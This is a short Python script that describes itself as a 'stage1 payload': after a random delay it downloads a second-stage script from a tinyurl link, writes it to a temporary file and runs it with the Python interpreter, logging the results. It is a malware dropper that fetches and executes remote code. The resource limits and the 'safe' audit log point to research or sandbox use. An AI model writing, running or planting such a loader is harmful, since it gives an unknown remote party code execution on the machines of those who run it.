'''
 # @ Create Time: 2025-08-13 16:00:05
 # @ Modified time: 2025-08-13 16:01:24
 # @ Description: stage1 payload and execute as a conditional process, wait for certain time to download stage 2 payload
'''

import time, random
from pathlib import Path
from urllib.request import Request, urlopen
import requests
import json
import platform
import subprocess
import tempfile
import os

# parameters you can tune
SUBPROCESS_TIMEOUT = 3600        # seconds; increase in sandbox if needed
CPU_SECONDS = 10               # soft+hard CPU time limit on Unix
MEM_BYTES = 200 * 1024 * 1024  # address space limit (approx 200 MB) on Unix
URL = "https://tinyurl.com/2cg9csuc"

# Lightweight audit log
LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT   = LOG_DIR / "safe_stage1.jsonl"

def log(event: str, **fields):
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    AUDIT.parent.mkdir(parents=True, exist_ok=True)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

# wait between 5 and 3600 seconds
wait_time = random.randint(5, 180)
log("wait_start", scheduled_seconds=wait_time)
time.sleep(wait_time)

response = requests.get(URL)
if response.status_code == 200:
    m_code = response.text
    try:
        # write payload to a temp file
        tf = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8")
        try:
            tf.write(m_code)
            tf.flush()
            payload_path = tf.name
        finally:
            tf.close()
    
        # build command
        cmd = [os.sys.executable, payload_path]

        # set resource limits on POSIX systems
        preexec_fn = None
        if platform.system() != "Windows":
            import resource
            def _limits():
                # limit CPU time (seconds)
                resource.setrlimit(resource.RLIMIT_CPU, (CPU_SECONDS, CPU_SECONDS))
                # limit address space (bytes)
                resource.setrlimit(resource.RLIMIT_AS, (MEM_BYTES, MEM_BYTES))
                # optionally, further limits could be set here
            preexec_fn = _limits
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=SUBPROCESS_TIMEOUT,
                preexec_fn=preexec_fn
            )

        except subprocess.TimeoutExpired as te:
            # timed out
            log("download_error", url=URL, error="timeout", timeout_seconds=SUBPROCESS_TIMEOUT)
        except Exception as e:
            # unexpected subprocess spawn/run error
            log("download_error", url=URL, error=f"subprocess error: {e}")
        else:
            # proc completed (may have exit code 0)
            log("download_attempt",
                url=URL,
                status=response.status_code,
                returncode=getattr(proc, "returncode", None),
                stdout=(proc.stdout[:2000] if proc.stdout else ""),
                stderr=(proc.stderr[:2000] if proc.stderr else "")
            )

    finally:
        try:
            os.remove(payload_path)
        except Exception:
            pass